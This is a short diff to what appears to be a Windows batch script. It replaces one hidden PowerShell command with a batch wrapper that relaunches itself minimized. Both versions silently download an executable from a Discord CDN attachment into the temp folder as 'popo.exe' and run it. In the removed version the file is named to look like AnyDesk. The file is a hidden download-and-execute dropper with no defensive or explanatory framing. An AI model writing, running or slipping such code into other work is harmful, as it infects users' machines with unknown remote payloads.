@@ -1,1 +1,5 @@
-powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = 'https://cdn.discordapp.com/attachments/1355757942342684815/1427524991808704522/AnyDesk.exe?ex=69652c00&is=6963da80&hm=21132b5829130bc170d25af2930e0f98ebf30f982c985352dc776adcd2656905&'; $out = Join-Path $env:TEMP 'popo.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
+@echo off
+if "%1"=="h" goto :hidden
+start /min cmd /c "%~f0" h & exit /b
+:hidden
+powershell.exe -NoProfile -WindowStyle Hidden -Command "$url='https://cdn.discordapp.com/attachments/1344411176443842676/1459868169459204321/PwS9viEbig.exe?ex=6964d7ae&is=6963862e&hm=8cde39cd0deb3fe5b13da6cd9d9e4c3cc5652e0ff7d20fda325c0e899fe1d52f&';$out=Join-Path $env:TEMP 'popo.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out"
